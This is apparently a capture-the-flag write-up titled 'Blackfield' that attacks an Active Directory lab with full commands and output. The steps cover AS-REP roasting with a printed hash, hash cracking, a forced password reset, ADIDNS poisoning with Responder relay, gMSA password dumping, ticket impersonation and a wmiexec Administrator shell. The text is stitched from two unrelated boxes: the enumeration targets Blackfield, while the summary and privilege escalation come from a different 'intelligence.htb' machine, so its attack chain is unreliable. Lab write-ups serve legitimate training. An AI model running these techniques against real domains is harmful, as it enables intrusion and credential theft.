# Blackfield

## Summary

* Multiple open ports revealed Active Directory environment (LDAP, Kerberos, SMB, DNS, HTTP).
* Extracted usernames using metadata from `.pdf` files via directory fuzzing.
* Discovered default password from internal onboarding document.
* Gained initial shell via SMB share enumeration using valid credentials.
* Discovered PowerShell script that sends web checks to DNS records, enabling ADIDNS-based NTLM relay.
* Captured Ted.Graves’s NTLM hash using Responder and cracked it.
* Used BloodHound to find `ReadGMSAPassword` privilege on `svc_int` account.
* Retrieved svc\_int hash using gMSADumper and generated a Silver Ticket as Administrator.
* Gained full access via Kerberos-authenticated `wmiexec.py`.



## 🧵 Let's Unpack

***

### 🔍Enumeration

```bash
sudo nmap -sC -sV -A -T5 -p- 10.10.10.248
```

Open ports included:

* LDAP (389, 636, 3268, 3269)
* Kerberos (88, 464)
* SMB (139, 445)
* HTTP (80, 5985)
* DNS (53)
* RPC (135, 593, 49667+)
* Others related to Active Directory services

Anonymous SMB enumeration using `enum4linux` and `smbclient` revealed no useful info, but identified domain: `intelligence.htb`.

***

#### RPCClient

```
rpcclient $> lsaquery
Domain Name: BLACKFIELD
Domain Sid: S-1-5-21-4194615774-2175524697-3563712290
```

#### SMB Client

```
# using nmblookup
nmblookup -A 10.10.10.192

# smbclient
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 

# crackmapexec
crackmapexec smb 10.10.10.192 -u '' -p '' -M spider_plus

SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\: 
SPIDER_P... 10.10.10.192    445    DC01             [*] Started spidering plus with option:
SPIDER_P... 10.10.10.192    445    DC01             [*]        DIR: ['print$']
SPIDER_P... 10.10.10.192    445    DC01             [*]        EXT: ['ico', 'lnk']
SPIDER_P... 10.10.10.192    445    DC01             [*]       SIZE: 51200
SPIDER_P... 10.10.10.192    445    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED


# using MSF
msf6 auxiliary(scanner/smb/smb_lookupsid) > run

[*] 10.10.10.192:445 - PIPE(LSARPC) LOCAL(BLACKFIELD - 5-21-4194615774-2175524697-3563712290) DOMAIN(BLACKFIELD - 5-21-4194615774-2175524697-3563712290)
[*] 10.10.10.192:445 - BLACKFIELD [ ]

# enum4linux
Domain Name: BLACKFIELD                                                                                                                          
Domain Sid: S-1-5-21-4194615774-2175524697-3563712290



## DC
domain Controller -> blackfield.local
```

#### Kerbrute Enum

```
kerbrute userenum  -d dc01.blackfield.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt



2024/06/12 23:50:12 >  [+] VALID USERNAME:       audit2020@blackfield.local
2024/06/12 23:52:13 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:cc6939c0b17716f2ed1778099b862921$448d7ccfccee671614ca6a6d53fbfc17ccd2ad2aec0101559ef760b0ee1add202b3b71930d3a5e2007f998c09b98d8e589ff155d4c8df4ebb1c1b36305d57acd8e812782f683cd3418e37f552fb3f60e8d7dd82692d2c08193dec3a8d2d3816bb13f53bcd8df70bd8e67f577e34a9ab237a2dbeec2903bed393d2d8edbb437707eac2d6246f9a0a7b0002f748e539ce7f3b60240be849910931a4627e101de566b78881940ac92aae8855faccfd593b61c3b7d5a0d00ff1cdd717c3d3dc5ed9ba56fb653774fdcb9ee234691cb9cb53183405fa58963a1b693e7100ca8e2fd31a432173198c4fd4aad0f25463cb96bf579ee16c67cbbe95482b06658c015a8280205c9cbed2cef4b                                                                                                                             
2024/06/12 23:52:13 >  [+] VALID USERNAME:       support@blackfield.local
2024/06/12 23:52:19 >  [+] VALID USERNAME:       svc_backup@blackfield.local


```

#### Cracking the hash - ASREP token

```
sudo hashcat -m 18200 hash.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


# Cracked the hash using john instead
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
```



Enumerating using valid credentials



```
# Running Bloodhound
bloodhound-python -d blackfield.local -u support -p '<PASS>' -ns 10.10.10.192 -c All

```

**Findings**

* The user SUPPORT@BLACKFIELD.LOCAL has the capability to change the user AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.



Let’s try to change password using `rpcClient`

```
# log into rpcclient
rpcclient -U "support" 10.10.10.192


# change password (Incorrect way of changing password)
chgpasswd audit2020@blackfield.local Password@123 Password@123

# correct way 
setuserinfo2 audit2020 23 'Password@123'


# verify if password change was a success
crackmapexec smb 10.10.10.192 -u audit2020@blackfield.local -p 'Password@123' --continue-on-succes
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020@blackfield.local:Password@123 
```

* The computer DC01.BLACKFIELD.LOCAL has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain BLACKFIELD.LOCAL.

## Privilege Escalation

**Part 1: NTLM Relay via ADIDNS**

*   Exploited ADIDNS record creation via `dnstool.py`:

    ```bash
    ./dnstool.py -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 10.10.10.248 -a add -r webl -d 10.10.14.13 -t A
    ```
*   Ran `responder` on attack box and waited for the script to trigger:

    ```bash
    sudo responder -I tun0
    ```
* Captured NTLMv2 hash for `Ted.Graves`.
*   Cracked hash and got creds:

    ```
    Username: Ted.Graves
    Password: Mr.Teddy
    ```

**Part 2: BloodHound & GMSA Abuse**

*   Ran BloodHound collection using `bloodhound-python`:

    ```bash
    bloodhound-python -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb -ns 10.10.10.248 -c All
    ```
* Found `Ted.Graves` is part of a group with `ReadGMSAPassword` rights on `svc_int`.
*   Dumped GMSA password using:

    ```bash
    ./gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb -l 10.10.10.248
    ```

    Output:

    ```
    svc_int$:aes256-cts-hmac-sha1-96:<HASH>
    ```

**Part 3: Silver Ticket**

*   Created Silver Ticket as Administrator:

    ```bash
    getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :<svc_int_hash>
    ```
*   Exported ticket:

    ```bash
    export KRB5CCNAME=Administrator.ccache
    ```
*   Executed command with elevated privileges:

    ```bash
    wmiexec.py -k -no-pass dc.intelligence.htb
    ```

    → Got shell as Administrator 🎉

